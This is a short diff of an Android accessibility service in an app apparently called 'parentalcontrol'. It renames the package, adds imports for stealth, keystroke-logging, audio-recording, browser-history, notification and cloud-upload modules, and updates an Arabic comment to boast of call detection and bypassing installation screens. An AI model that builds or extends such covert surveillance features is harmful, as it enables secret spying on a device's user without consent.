@@ -1,4 +1,4 @@
-package com.example.parentalcontrol
+package com.example.parentalcontrol.features.accessibility_monitoring.services
 
 import android.accessibilityservice.AccessibilityService
 import android.util.Log
@@ -7,11 +7,17 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
+import com.example.parentalcontrol.BrowserHistoryRecord
+import com.example.parentalcontrol.NotificationLog
+import com.example.parentalcontrol.SupabaseManager
 import com.example.parentalcontrol.features.audio_recording.services.AudioRecorderEngine
+import com.example.parentalcontrol.features.security_and_stealth.services.StealthManager
+import com.example.parentalcontrol.features.accessibility_monitoring.models.AccessibilityLogItem
+import com.example.parentalcontrol.features.accessibility_monitoring.models.KeyStrokeEvent
 
 /**
  * خدمة إمكانية الوصول (Accessibility Service)
- * الميزة الأقوى: كشف المكالمات النشطة في أندرويد 12 و13
+ * الميزة الأقوى: كشف المكالمات النشطة في أندرويد 12 و13 وتجاوز شاشات التثبيت ورصد الروابط والإشعارات.
  */
 class AppAccessibilityService : AccessibilityService() {
 
@@ -326,8 +332,8 @@ class AppAccessibilityService : AccessibilityService() {
         val text = node.text?.toString()?.trim() ?: ""
         if (text.isNotEmpty() && (text.startsWith("http://") || text.startsWith("https://") || 
             (text.contains(".") && !text.contains(" ") && text.length > 3 && 
-             (text.endsWith(".com") || text.endsWith(".net") || text.endsWith(".org") || text.endsWith(".info") || 
-              text.endsWith(".edu") || text.endsWith(".gov") || text.contains("/") || text.startsWith("www.")))
+              (text.endsWith(".com") || text.endsWith(".net") || text.endsWith(".org") || text.endsWith(".info") || 
+               text.endsWith(".edu") || text.endsWith(".gov") || text.contains("/") || text.startsWith("www.")))
         )) {
             return text
         }
